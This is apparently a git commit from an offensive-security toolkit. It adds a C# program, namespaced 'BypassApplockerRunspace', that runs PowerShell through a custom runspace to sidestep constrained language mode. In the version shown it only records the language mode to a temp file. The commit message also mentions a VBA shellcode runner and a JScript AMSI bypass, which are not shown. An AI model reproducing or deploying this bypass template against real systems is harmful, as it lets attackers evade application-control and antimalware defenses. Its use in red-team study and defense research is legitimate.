213d5a2a159299d313909a637ff921bc4c54eabd
Chris Thompson <cthompson@focal-point.com>
2021-04-02 16:59:58 -0400

    Exec powershell via C#, VBA caesar-encrypted shellcode runner, Jscript AMSI bypass

---
+++ csharp/powershell_runspace.cs
@@ -0,0 +1,23 @@
+﻿using System;
+using System.Management.Automation;
+using System.Management.Automation.Runspaces;
+
+namespace BypassApplockerRunspace
+{
+    class Program
+    {
+        static void Main(string[] args)
+        {
+            Runspace rs = RunspaceFactory.CreateRunspace();
+            rs.Open();
+            
+            PowerShell ps = PowerShell.Create();
+            ps.Runspace = rs;
+
+            String cmd = "$ExecutionContext.SessionState.LanguageMode | Out-File -FilePath c:\\Windows\\Temp\\out.txt";
+            ps.AddScript(cmd);
+            ps.Invoke();
+            rs.Close();
+        }
+    }
+}
